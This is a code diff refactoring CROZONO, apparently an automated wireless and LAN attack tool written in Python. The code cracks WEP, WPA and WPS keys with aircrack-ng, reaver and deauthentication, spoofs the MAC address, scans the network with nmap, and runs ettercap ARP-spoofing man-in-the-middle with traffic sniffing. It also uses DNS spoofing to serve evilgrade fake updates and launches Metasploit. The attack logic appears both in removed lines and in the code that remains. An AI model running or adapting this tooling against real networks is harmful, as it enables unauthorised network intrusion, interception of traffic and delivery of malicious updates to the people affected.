@@ -28,14 +28,16 @@ import pexpect
 import socket
 import subprocess
 import random
-from subprocess import Popen, call, PIPE
 from poormanslogging import info, warn, error
+
+from .utils import device_manager as dev_mgr
+from .utils import sys_check as checks
+
 
 # ## GLOBAL VARIABLES ##
 version = '1.5'
 OS_PATH = os.getcwd()
 LOG_FILE = OS_PATH + '/log_temp'
-DN = open(os.devnull, 'w')
 
 # ## ATTACKS TIME ##
 AIRODUMP_SCAN_TIME = 30
@@ -57,9 +59,9 @@ def get_target_mitm(gateway, ip_crozono):
 
 
 def get_current_essid(iface):
-	iwc = subprocess.Popen(['iwconfig', iface], stdout=PIPE)
-	hea = subprocess.Popen(['head', '-1'], stdin=iwc.stdout, stdout=PIPE)
-	gre = subprocess.Popen(['grep', '-oP', '\".+\"'], stdin=hea.stdout, stdout=PIPE)
+	iwc = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
+	hea = subprocess.Popen(['head', '-1'], stdin=iwc.stdout, stdout=subprocess.PIPE)
+	gre = subprocess.Popen(['grep', '-oP', '\".+\"'], stdin=hea.stdout, stdout=subprocess.PIPE)
 	sout, serr = gre.communicate()
 	if serr is not None:
 		error("Error getting the current ESSID")
@@ -74,10 +76,10 @@ def connect(essid, key, iface_mon=None):
 	tries = 0
 
 	if iface_mon is not None:
-			call(['airmon-ng', 'stop', iface_mon], stdout=DN, stderr=DN)
+			subprocess.call(['airmon-ng', 'stop', iface_mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 			time.sleep(1)
 
-	iface = get_ifaces()[0]
+	iface = dev_mgr.get_ifaces()[0]
 
 	def do_connect():
 		nonlocal sock
@@ -99,18 +101,18 @@ def connect(essid, key, iface_mon=None):
 				wpa_supplicant.write('psk="' + key.strip() + '"\n')
 				wpa_supplicant.write('}')
 				wpa_supplicant.close()
-				call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
-				call(['dhclient', iface, '-r'], stdout=DN, stderr=DN)
-				call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
-				call(['iwconfig', iface, 'mode', 'managed'])
-				call(['killall', 'wpa_supplicant'], stdout=DN, stderr=DN)
-				call(['wpa_supplicant', '-B', '-c', '/etc/wpa_supplicant/wpa_supplicant.conf', '-i', iface], stdout=DN,
-					stderr=DN)
+				subprocess.call(['ifconfig', iface, 'down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+				subprocess.call(['dhclient', iface, '-r'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+				subprocess.call(['ifconfig', iface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+				subprocess.call(['iwconfig', iface, 'mode', 'managed'])
+				subprocess.call(['killall', 'wpa_supplicant'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+				subprocess.call(['wpa_supplicant', '-B', '-c', '/etc/wpa_supplicant/wpa_supplicant.conf', '-i', iface], stdout=subprocess.DEVNULL,
+					stderr=subprocess.DEVNULL)
 				time.sleep(2)
 		parse_log_connect.close()
 		os.remove(LOG_FILE)
 		tries += 1
-		call(['dhclient', iface], stdout=DN, stderr=DN)
+		subprocess.call(['dhclient', iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 		time.sleep(4)
 
 	do_connect()
@@ -137,75 +139,6 @@ def save_key(essid, key):
 		f.close()
 
 
-def wpa_attack(bssid, channel, iface_mon):
-	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
-		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
-		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
-		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
-		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')
-
-	cmd_airodump = pexpect.spawn(
-			'airodump-ng --bssid {0} -c {1} -w cr0z0n0_attack {2}'.format(bssid, channel, iface_mon))
-	time.sleep(5)
-
-	cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(bssid, iface_mon))
-	time.sleep(10)
-	cmd_aireplay.close()
-
-	cmd_airodump.expect(['handshake:', pexpect.TIMEOUT, pexpect.EOF], WPA_EXPECT_HANDSHAKE_TIME)
-	cmd_airodump.close()
-
-	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
-	cmd_crack.logfile = open(LOG_FILE, 'wb')
-	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], WPA_AIRCRACK_TIME)
-	cmd_crack.close()
-	key_found = False
-	parse_log_crack = open(LOG_FILE, 'r')
-	for line in parse_log_crack:
-		where = line.find('KEY FOUND!')
-		if where > -1:
-			key_end = line.find(']')
-			key_found = line[where + 13:key_end]
-	parse_log_crack.close()
-	os.remove(LOG_FILE)
-
-	return key_found
-
-
-def wpa_with_wps_attack(bssid, channel, iface_mon):
-	cmd_reaver = pexpect.spawn(
-			'reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(iface_mon, channel, bssid))  # no ended
-	cmd_reaver.logfile = open(LOG_FILE, 'wb')
-	cmd_reaver.expect(['WPS pin not found!', pexpect.TIMEOUT, pexpect.EOF], 30)
-	cmd_reaver.close()
-
-	key_found = False
-	parse_log_crack = open(LOG_FILE, 'r')
-	for line in parse_log_crack:
-		if line.find('WPA PSK: ') != -1:
-			key_found = line[line.find("WPA PSK: '") + 10:-1]
-	parse_log_crack.close()
-	os.remove(LOG_FILE)
-
-	return key_found
-
-
-def wps_check(bssid, iface_mon):
-	cmd_wps = pexpect.spawn('wash -i {0}'.format(iface_mon))
-	cmd_wps.logfile = open(LOG_FILE, 'wb')
-	cmd_wps.expect([bssid, pexpect.TIMEOUT, pexpect.EOF], 30)
-	cmd_wps.close()
-
-	wps = False
-	parse_log_wps = open(LOG_FILE, 'r')
-	for line in parse_log_wps:
-		if line.find(bssid) != -1:
-			wps = True
-	parse_log_wps.close()
-	os.remove(LOG_FILE)
-
-	return wps
-
 
 def wep_attack(essid, bssid, channel, new_mac, iface_mon):
 	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
@@ -215,7 +148,7 @@ def wep_attack(essid, bssid, channel, new_mac, iface_mon):
 		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')
 
 	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon],
-						stdout=DN, stderr=DN)
+						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid, bssid, new_mac, iface_mon))
 	cmd_auth.logfile = open(LOG_FILE, 'wb')
@@ -228,8 +161,8 @@ def wep_attack(essid, bssid, channel, new_mac, iface_mon):
 	parse_log_auth.close()
 	os.remove(LOG_FILE)
 
-	proc_aireplay = Popen(['aireplay-ng', '-3', '-e', '"' + essid + '"', '-b', bssid, '-h', new_mac, iface_mon],
-						stdout=DN, stderr=DN)
+	proc_aireplay = subprocess.Popen(['aireplay-ng', '-3', '-e', '"' + essid + '"', '-b', bssid, '-h', new_mac, iface_mon],
+						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 	time.sleep(WEP_AIREPLAY_TIME)
 
@@ -307,64 +240,6 @@ def scan_targets(iface_mon, essid=None):
 					return ap
 
 
-def mac_changer(iface_mon):
-	import string
-	s = "".join(random.sample(string.hexdigits, 12))
-	s = (":".join([i + j for i, j in zip(s[::2], s[1::2])])).lower()
-	call(['ifconfig', iface_mon, 'down'], stdout=DN, stderr=DN)
-	call(['macchanger', '-m', s, iface_mon], stdout=DN, stderr=DN)
-	call(['ifconfig', iface_mon, 'up'], stdout=DN, stderr=DN)
-	return s
-
-
-def check_interfering_processes(kill=True):
-	s = subprocess.Popen(['airmon-ng', 'check', 'kill' if kill else None], stdout=DN)
-	_, err = s.communicate()
-	if err is not None:
-		error('Error when killing interfering processes!')
-		return False
-	return True
-
-
-def toggle_mode_monitor(iface, setting=True):
-	check_interfering_processes(kill=True)
-	subprocess.Popen(['airmon-ng', 'start' if setting else 'stop', iface], stdout=PIPE, stderr=PIPE).communicate()
-	proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
-
-	for line in proc.communicate()[0].decode().split('\n'):
-		if 'Mode:Monitor' in line:
-			iface_mon = line.split()[0]
-			return iface_mon
-		else:
-			error("Could not set interface in monitor mode!")
-			exit()
-
-
-def get_gateway():
-	import struct
-	with open('/proc/net/route', 'r') as fh:
-		for line in fh:
-			fields = line.strip().split()
-			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-				continue
-			return socket.inet_ntoa(struct.pack("=L", int(fields[2], 16)))
-
-
-def get_ifaces():
-	"""Returns a list of interfaces (reported by airmon-ng) prefixed by the 'prefix' keyword"""
-	ang = subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE)
-	sout, serr = ang.communicate()
-	i = list(filter(lambda x: x is not '' and not x.startswith("PHY"), sout.decode().split("\n")))
-	return list(map(lambda x: x.split("\t")[1], i))
-
-
-def hardware_setup():
-	info("Setting interface to monitor mode")
-	iface = get_ifaces()[0]
-	iface_mon = toggle_mode_monitor(iface, True)
-	return iface_mon
-
-
 def parse_args():
 	import argparse
 	parser = argparse.ArgumentParser()
@@ -375,37 +250,7 @@ def parse_args():
 	return parser.parse_args()
 
 
-def check_lan_attacks_dependences():
-	if not os.path.exists('/usr/bin/nmap'):
-		error("You must install Nmap.")
-		exit(1)
-	if not os.path.exists('/usr/bin/ettercap'):
-		error("You must install Ettercap.")
-		return False
-	if not os.path.exists('/usr/bin/tshark'):
-		error("You must install Tshark.")
-		return False
-	if not os.path.exists('/usr/bin/msfconsole'):
-		error("You must install Metasploit.")
-		return False
-	return True
 
-
-def check_wlan_attacks_dependences():
-	if not os.path.exists('/usr/bin/aircrack-ng'):
-		error("You must install aircrack-ng suite.")
-		return False
-	if not os.path.exists('/usr/bin/reaver'):
-		error("You must install Reaver.")
-		return False
-	if not os.path.exists('/usr/bin/pixiewps'):
-		error("You must install PixieWPS.")
-		return False
-	return True
-
-
-def check_root():
-	return os.geteuid() == 0
 
 
 def banner():
@@ -422,10 +267,10 @@ def banner():
 
 def main():
 	banner()
-	if not check_root():
+	if not checks.check_root():
 		error('You need root privileges to run CROZONO!\n')
 		exit(1)
-	if not check_wlan_attacks_dependences():
+	if not checks.check_wlan_attacks_dependencies():
 		exit(1)
 
 	info("CROZONO running...")
@@ -437,12 +282,12 @@ def main():
 			ap_target = False
 			ip_lan = connect(args.essid, args.key)
 		else:
-			iface_mon = hardware_setup()
-			new_mac = mac_changer(iface_mon)
+			iface_mon = dev_mgr.hardware_setup()
+			new_mac = dev_mgr.mac_changer(iface_mon)
 			ap_target = scan_targets(iface_mon, args.essid)
 	else:
-		iface_mon = hardware_setup()
-		new_mac = mac_changer(iface_mon)
+		iface_mon = dev_mgr.hardware_setup()
+		new_mac = dev_mgr.mac_changer(iface_mon)
 		ap_target = scan_targets(iface_mon)
 
 	# -------------------- Infiltrate wifi --------------------
@@ -466,23 +311,24 @@ def main():
 				ip_lan = connect(target_essid, key, iface_mon)
 
 		elif target_privacy == 'WPA' or target_privacy == 'WPA2' or target_privacy == 'WPA2 WPA':
+			from .attacks import wpa
 			info("Cracking {e} access point with {p} privacy...".format(e=target_essid, p=target_privacy))
 
-			wps = wps_check(target_bssid, iface_mon)
+			wps = wpa.wps_check(target_bssid, iface_mon)
 
 			if wps:
 				info("WPS is enabled")
-				key = wpa_with_wps_attack(target_bssid, target_channel, iface_mon)
+				key = wpa.wpa_with_wps_attack(target_bssid, target_channel, iface_mon)
 				if not key:
 					warn("PIN not found! Trying with conventional WPA attack...")
-					key = wpa_attack(target_bssid, target_channel, iface_mon)
+					key = wpa.wpa_attack(target_bssid, target_channel, iface_mon)
 			else:
 				warn("WPS is not enabled")
-				key = wpa_attack(target_bssid, target_channel, iface_mon)
+				key = wpa.wpa_attack(target_bssid, target_channel, iface_mon)
 
 			if not key:
 				error("Key not found! :(")
-				exit()
+				exit(1)
 			else:
 				info("Key found!: {k} ".format(k=key))
 				save_key(target_essid, key)
@@ -502,7 +348,7 @@ def main():
 	if os.path.exists(OS_PATH + '/cr0z0n0_nmap'):
 		os.remove(OS_PATH + '/cr0z0n0_nmap')
 
-	if not check_lan_attacks_dependences():
+	if not checks.check_lan_attacks_dependencies():
 		exit(1)
 
 	attacker = args.dest
@@ -517,7 +363,7 @@ def main():
 		banner()
 		info("Hello! :)")
 		info("Executing Nmap...")
-		call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=DN)
+		subprocess.call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=subprocess.DEVNULL)
 	else:
 		warn("Attacker not defined! Ending...")
 		exit()
@@ -527,15 +373,15 @@ def main():
 	attack = args.attack
 
 	if attack == 'sniffing-mitm':
-		iface = get_ifaces()[0]
-		gateway = get_gateway().strip()
+		iface = dev_mgr.get_ifaces()[0]
+		gateway = dev_mgr.get_gateway().strip()
 		target_mitm = get_target_mitm(gateway, ip_lan)
 		info("Executing MITM and Sniffing attacks between {g} and {m}...".format(g=gateway, m=target_mitm))
 		cmd_ettercap = pexpect.spawn(
 				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i}'.format(g=gateway, m=target_mitm, i=iface))
 		time.sleep(2)
 		# cmd_tshark = pexpect.spawn('tshark -i {i} -w cr0z0n0_sniff'.format(i=iface))
-		proc = subprocess.call(["tshark", "-i", iface], stderr=DN)
+		proc = subprocess.call(["tshark", "-i", iface], stderr=subprocess.DEVNULL)
 
 	elif attack == 'evilgrade':
 		modules = open(OS_PATH + '/evilgrade/modules.txt', 'r')
@@ -548,7 +394,7 @@ def main():
 		s.shutdown(1)
 
 		if os.path.exists('/etc/ettercap/etter.dns'):
-			call(['rm', '/etc/ettercap/etter.dns'])
+			subprocess.call(['rm', '/etc/ettercap/etter.dns'])
 		etter_template = open(OS_PATH + '/evilgrade/etter.dns.template', 'r')
 		etter_dns = open(OS_PATH + '/evilgrade/etter.dns', 'w')
 		for line in etter_template:
@@ -556,7 +402,7 @@ def main():
 			etter_dns.write(line)
 		etter_dns.close()
 		etter_template.close()
-		call(['mv', './evilgrade/etter.dns', '/etc/ettercap/etter.dns'])
+		subprocess.call(['mv', './evilgrade/etter.dns', '/etc/ettercap/etter.dns'])
 
 		evilgrade = pexpect.spawn('evilgrade')
 		evilgrade.expect('evilgrade>')
@@ -565,8 +411,8 @@ def main():
 		evilgrade.sendline('start')
 		time.sleep(1)
 
-		iface = get_ifaces()[0]
-		gateway = get_gateway().strip()
+		iface = dev_mgr.get_ifaces()[0]
+		gateway = dev_mgr.get_gateway().strip()
 		target_mitm = get_target_mitm(gateway, ip_lan)
 		cmd_ettercap = pexpect.spawn(
 				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i} -P dns_spoof'.format(g=gateway, m=target_mitm, i=iface))
@@ -574,7 +420,7 @@ def main():
 
 	elif attack == 'metasploit':
 		info("Executing Metasploit...")
-		proc = subprocess.call(["msfconsole"], stderr=DN)
+		proc = subprocess.call(["msfconsole"], stderr=subprocess.DEVNULL)
 	else:
 		warn("Attack not defined!")
 
